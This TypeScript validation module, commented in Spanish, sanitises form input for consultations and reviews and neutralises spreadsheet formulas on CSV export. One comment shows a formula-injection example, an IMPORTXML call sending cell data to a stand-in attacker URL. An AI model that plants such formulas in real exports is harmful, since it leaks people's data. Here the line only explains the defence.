/**
 * Validación y saneamiento de todo lo que llega de afuera.
 *
 * Se aplica en el servidor, siempre, sin importar lo que haya validado el
 * navegador: los atributos `required` y `minLength` del formulario son una
 * comodidad para la persona, no un control de seguridad.
 */

/** Resultado uniforme: o hay valor, o hay un mensaje para mostrarle a la persona. */
export type Resultado<T> =
  { ok: true; valor: T } | { ok: false; error: string };

export const ok = <T>(valor: T): Resultado<T> => ({ ok: true, valor });
export const error = (mensaje: string): Resultado<never> => ({
  ok: false,
  error: mensaje,
});

/**
 * Normaliza texto libre antes de guardarlo.
 *
 * - Quita caracteres de control, que no aportan nada y ensucian exportaciones.
 * - Colapsa espacios y saltos repetidos.
 * - Recorta a la longitud máxima.
 *
 * No escapa HTML a propósito: React escapa al renderizar, y guardar el texto ya
 * escapado haría que se vieran `&amp;` en el panel. El escape es responsabilidad
 * del punto de salida, no del de entrada.
 */
export function limpiarTexto(valor: unknown, maximo: number): string {
  if (typeof valor !== "string") return "";
  return (
    valor
      // eslint-disable-next-line no-control-regex -- justamente se trata de quitarlos
      .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "")
      .replace(/[ \t]+/g, " ")
      .replace(/\n{3,}/g, "\n\n")
      .trim()
      .slice(0, maximo)
  );
}

/**
 * Neutraliza el texto que puede terminar en una planilla.
 *
 * Excel, Google Sheets y LibreOffice interpretan como fórmula cualquier celda
 * que empiece con `=`, `+`, `-` o `@`. Si alguien exporta los turnos a CSV, un
 * nombre como `=IMPORTXML("https://atacante/?q="&A2,"//x")` se ejecuta al abrir
 * el archivo. Anteponer un apóstrofo lo deja como texto literal.
 *
 * Acá se aplica sólo en la exportación, no al guardar: la base guarda el dato
 * tal como se escribió.
 */
export function neutralizarFormula(valor: string): string {
  const primerVisible = valor.replace(/^\s+/, "").charAt(0);
  return ["=", "+", "-", "@"].includes(primerVisible) ? `'${valor}` : valor;
}

export function validarNombre(valor: unknown): Resultado<string> {
  const nombre = limpiarTexto(valor, 80);
  if (nombre.length < 3)
    return error("El nombre tiene que tener al menos 3 caracteres.");
  if (!/\p{L}/u.test(nombre))
    return error("El nombre tiene que incluir letras.");
  return ok(nombre);
}

export function validarEdad(valor: unknown): Resultado<number> {
  const edad = Number(valor);
  if (!Number.isInteger(edad))
    return error("La edad tiene que ser un número entero.");
  if (edad < 18)
    return error("La consulta debe solicitarla una persona mayor de 18 años.");
  if (edad > 110) return error("Revisá la edad ingresada.");
  return ok(edad);
}

export function validarSituacion(valor: unknown): Resultado<string> {
  const texto = limpiarTexto(valor, 700);
  if (texto.length < 15)
    return error("Contanos un poco más sobre tu situación.");
  return ok(texto);
}

export function validarNombrePublico(valor: unknown): Resultado<string> {
  const nombre = limpiarTexto(valor, 50);
  if (nombre.length < 2) return error("Indicá un nombre o tus iniciales.");
  return ok(nombre);
}

export function validarOpinion(valor: unknown): Resultado<string> {
  const texto = limpiarTexto(valor, 600);
  if (texto.length < 25)
    return error("Contanos un poco más para poder publicarla.");
  return ok(texto);
}

/**
 * La calificación es un entero de 1 a 5.
 *
 * Todo el rango, incluidas 1 y 2 estrellas. Ofrecer sólo 3, 4 y 5 —como hacía
 * el formulario anterior— no es moderación: es sesgar la recolección para que
 * el promedio salga bien.
 */
export function validarCalificacion(valor: unknown): Resultado<number> {
  const puntaje = Number(valor);
  if (!Number.isInteger(puntaje) || puntaje < 1 || puntaje > 5) {
    return error("La calificación tiene que ser un número entero del 1 al 5.");
  }
  return ok(puntaje);
}

/**
 * Campo trampa para bots.
 *
 * Está en el formulario, oculto por posición y marcado `aria-hidden` con
 * `tabindex="-1"`, así que ninguna persona ni lector de pantalla lo completa.
 * Un bot que rellena todo lo que encuentra, sí. Devuelve `true` si hay que
 * descartar el envío.
 */
export const pareceBot = (honeypot: unknown): boolean =>
  typeof honeypot === "string" && honeypot.trim().length > 0;

/** Lee el cuerpo JSON sin que un cuerpo malformado tire un 500. */
export async function leerJSON(
  request: Request,
): Promise<Record<string, unknown> | null> {
  try {
    const cuerpo = await request.json();
    return cuerpo && typeof cuerpo === "object" && !Array.isArray(cuerpo)
      ? (cuerpo as Record<string, unknown>)
      : null;
  } catch {
    return null;
  }
}
